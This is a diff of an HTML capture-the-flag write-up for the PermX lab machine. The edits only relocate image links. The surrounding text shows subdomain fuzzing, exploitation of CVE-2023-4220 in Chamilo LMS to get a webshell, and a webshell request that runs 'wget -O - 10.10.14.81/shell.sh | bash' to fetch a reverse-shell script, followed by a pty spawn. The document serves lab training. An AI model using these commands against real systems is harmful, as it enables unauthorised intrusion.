@@ -47,9 +47,9 @@ PORT   STATE SERVICE VERSION
 |_http-title: eLEARNING
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
-<p><img src="/_resources/b3c9ce47fc1c47fc821ba332e748951d.png" /></p>
+<p><img src=":/b3c9ce47fc1c47fc821ba332e748951d" alt="85c2485f62c37e9ae8565ba0b2970610.png" /></p>
 <p>We can traverse whole server, but nothing interesting seems to be on it.</p>
-<p><img src="/_resources/8a552942644f4f9f8f52cc9245096c01.png" /></p>
+<p><img src=":/8a552942644f4f9f8f52cc9245096c01" alt="9550f55b0a3b80bf8f965611289b4dc9.png" /></p>
 <div><pre class="hljs"><code>└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://FUZZ.permx.htb -H "Host: FUZZ.permx.htb" -fc 302 -t 200
 
         /'___\  /'___\           /'___\       
@@ -77,19 +77,19 @@ ________________________________________________
 www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 45ms]
 lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 7517ms]</code></pre></div>
 <p>www subdomain doesnt seem to work, but tells us something about our next subdomain.<br />
-<img src="/_resources/f267759fa49a4e39b8f5b7ecaefb6d0b.png" /></p>
+<img src=":/f267759fa49a4e39b8f5b7ecaefb6d0b" alt="b37eec54add251d3694bf7972fc61b7c.png" /></p>
 <p>And the second domain seems to be our way in.<br />
-<img src="/_resources/0b87f5b240f540bc9399ad3cf43b5fa2.png" /></p>
+<img src=":/0b87f5b240f540bc9399ad3cf43b5fa2" alt="49d4270d441f309820e01a1a5549c180.png" /></p>
 <h1 id="cve-2023-4220">CVE-2023-4220</h1>
 <p>Checking as usualy for exploits, we can find <a title="https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS" href="https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS">https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS</a>.<br />
 Seems new, so maybe its not patched. Running the test script we get:</p>
-<p><img src="/_resources/a86f038d30244ca3b05e8ae0814efe23.png" /></p>
+<p><img src=":/a86f038d30244ca3b05e8ae0814efe23" alt="a47cc90928f0b1c4a5b96af846dce981.png" /></p>
 <p>Running the exploit gives us a webshell.</p>
-<p><img src="/_resources/a6ed01ed30314327958f0fe4683ffd6d.png" /></p>
-<p><img src="/_resources/c7323e4547644594a2692540eb20dcb9.png" /></p>
+<p><img src=":/a6ed01ed30314327958f0fe4683ffd6d" alt="a31b6017e4493c3a80139d3b640aac4e.png" /></p>
+<p><img src=":/c7323e4547644594a2692540eb20dcb9" alt="63f606b9e413ad01102e0408304e58ac.png" /></p>
 <p>We can modify the cmd var contents, so that it creates a revese shell. In burp we can send the request to repeater, modify the cmd variable to <code>wget -O - 10.10.14.81/shell.sh | bash</code>, encode it, send it and we are in.<br />
 <a title="http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget%20-O%20-%2010.10.14.81%2fshell.sh%20%7c%20bash" href="http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget%20-O%20-%2010.10.14.81%2fshell.sh%20%7c%20bash">http://lms.parmx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=wget -O - 10.10.14.81%2Fshell.sh | bash</a></p>
-<p><img src="/_resources/906e0191bc93456ab04a24e5bc944c82.png" /></p>
+<p><img src=":/906e0191bc93456ab04a24e5bc944c82" alt="9252b46682ffba8547eff810f3665188.png" /></p>
 <p>For QoL, we can get shell stablisation.</p>
 <div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
 <span class="hljs-built_in">export</span> TERM=xterm
